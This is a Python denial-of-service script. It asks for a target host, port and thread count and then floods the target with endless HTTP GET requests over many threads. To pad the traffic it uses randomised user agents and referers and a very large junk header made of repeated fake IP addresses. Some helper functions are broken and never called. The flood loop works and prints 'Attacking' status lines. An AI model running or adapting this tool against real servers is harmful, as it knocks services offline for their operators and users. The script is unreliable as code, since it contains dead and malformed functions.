import threading
import os, sys
import socket
import time
import random
import requests

useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
ref=['http://www.bing.com/search?q=',
'https://www.ndex.com/ndsearch?text=',
'https://duckduckgo.com/?q=']
acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept-Encoding: gzip, deflate\r\n",
"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
"Accept-Language: en-US,en;q=0.5\r\n"]
lolagent = [""" 45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389
45.777.29.38:443 192.42.56.89:80 38.60.8.1:3389 """]
ip = str(input('[+] Target: '))
ip = socket.gethostbyname(ip)
port = int(input('[+] Port: '))
pack = int(input('[+] Packet/s: '))
num_threads = int(input('[+] Threads: '))
threads = []
results = []
def randomip():
  global sock
  sock = random._urandom(38888) 
  randip = [192, 168, 0, 1]
  randip1 = random.randint(3,255)
  randip2 = random.randint(3,255)
  randip3 = random.randint(3,255)
  randip4 = random.randint(3,255)
  randip5 = random.randint(3,255)
 
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)
  randip.append(randip5) 
  
  socket.socket(socket.AF_INET,socket.SOCK_STREAM)

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3]) + "." + str(randip[4]) + "." + str(randip[5])
  return(randip)
def flooder():
    global sock3, sock4, addr
    sock3 = [192, 168, 0, 1]
    sock4 = random._urandom(10999)
    addr = "."
    sock3[0] = str(random.randrange(18928))
    sock3[1] = str(random.randrange(18928))
    sock3[2] = str(random.randrange(18928))
    sock3[3] = str(random.randrange(18928))
    sock3[4] = str(random.randrange(18928))
    addres = sock3[0] + addr + sock3[1] + addr + sock3[2] + addr + sock3[3] + addr + sock4[4] + addr + "\r\n"
    return addres
def start3():
    global useragents, ref, acceptall, lolagent
    hh = random._urandom(75006)
    xx = int(0)
    lolaccept ="LolAccept: "+random.choice(lolagent)+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+str(ip)+"\r\n"
    useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
    accept = random.choice(acceptall)
    reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
    lolfirst = "GetFirst: "+random.choice(lolagent)+random.choice(ref)+random.choice(acceptall)+random.choice(useragents)+"\r\n"
    main_req  = target_host + useragen + accept + lolfirst + reffer + lolaccept+ content + length + "\r\n"
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(ip),int(port)))
            s.send(str.encode(main_req))
            for i in range(pack):
                s.send(str.encode(main_req))
            xx += random.randint(0, int(pack))
            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
        except:
            s.close()
            print('[+] Server Down.')
def start2():
    global useragents, ref, acceptall, lolagent
    hh = random._urandom(7560)
    xx = int(0)
    lolaccept ="LolAccept: "+random.choice(lolagent)+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+str(ip)+"\r\n"
    useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
    accept = random.choice(acceptall)
    reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
    lolfirst = "GetFirst: "+random.choice(lolagent)+random.choice(ref)+random.choice(acceptall)+random.choice(useragents)+"\r\n"
    main_req  = target_host + useragen + accept + lolfirst + reffer + lolaccept+ content + length + "\r\n"
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(ip),int(port)))
            s.send(str.encode(main_req))
            for i in range(pack):
                s.send(str.encode(main_req))
            xx += random.randint(0, int(pack))
            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
        except:
            s.close()
def start():
    global useragents, ref, acceptall, lolagent
    hh = random._urandom(75006)
    xx = int(0)
    lolaccept ="LolAccept: "+random.choice(lolagent)+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+str(ip)+"\r\n"
    useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
    accept = random.choice(acceptall)
    reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
    lolfirst = "GetFirst: "+random.choice(lolagent)+random.choice(ref)+random.choice(acceptall)+random.choice(useragents)+"\r\n"
    main_req  = target_host + useragen + accept + lolfirst + reffer + lolaccept+ content + length + "\r\n"
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(ip),int(port)))
            s.send(str.encode(main_req))
            for i in range(pack):
                s.send(str.encode(main_req))
            xx += random.randint(0, int(pack))
        except:
            s.close()

for _ in range(num_threads):
    thread = threading.Thread(target=start)
    threads.append(thread)
    thread.start()
for thread in threads:
    thread.join()
for num_threads in range(100):
    thread = threading.Thread(target=start2)
    results.append(thread)
    thread.start()
for thread in results:
    thread.join()
